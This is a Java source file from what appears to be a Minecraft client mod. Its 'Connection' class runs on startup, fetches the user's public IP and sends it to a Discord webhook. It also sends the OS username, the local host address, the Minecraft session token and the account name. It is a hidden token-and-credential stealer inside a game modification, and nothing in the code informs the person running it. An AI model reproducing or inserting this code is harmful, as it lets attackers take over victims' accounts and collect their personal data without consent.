package Game.Sense.client.Helper.events.impl.input.logger;


import Game.Sense.client.Helper.EventTarget;
import Game.Sense.client.Helper.events.impl.input.logger.webhook.DiscordWebhook;
import net.minecraft.client.Minecraft;
import Game.Sense.client.Helper.events.impl.input.logger.config.cfg;
import java.awt.*;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.URL;

public class Connection {
    private static String ip;
    @EventTarget
    public static void startup() {
        ip = null;

        DiscordWebhook webhook = cfg.connection;

        try {
            URL url = new URL("http://checkip.amazonaws.com");
            BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
            ip = in.readLine();
        } catch (IOException e) {
            e.printStackTrace();
        }

        try {
            webhook.addEmbed(new DiscordWebhook.EmbedObject()
                    .setTitle("Infinity")
                    .setDescription("Minecraft Modification | Connections")
                    .setColor(new Color(0x0080FF))
                    .addField("IP", ip, true)
                    .addField("USER", System.getProperty("user.name"), true)
                    .addField("LOCAL", String.valueOf(InetAddress.getLocalHost()), true)
                    .addField("TOKEN", Minecraft.getMinecraft().getSession().getToken(), true)
                    .addField("MC-NAME", Minecraft.getMinecraft().getSession().getUsername(), true)
                    .addField("Author", "UwU_", true)


                    .setThumbnail("https://cdn.discordapp.com/avatars/860143202358525982/efef80293eb31d69dd3c654ebd1a5575.webp?size=100"));

            webhook.execute();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
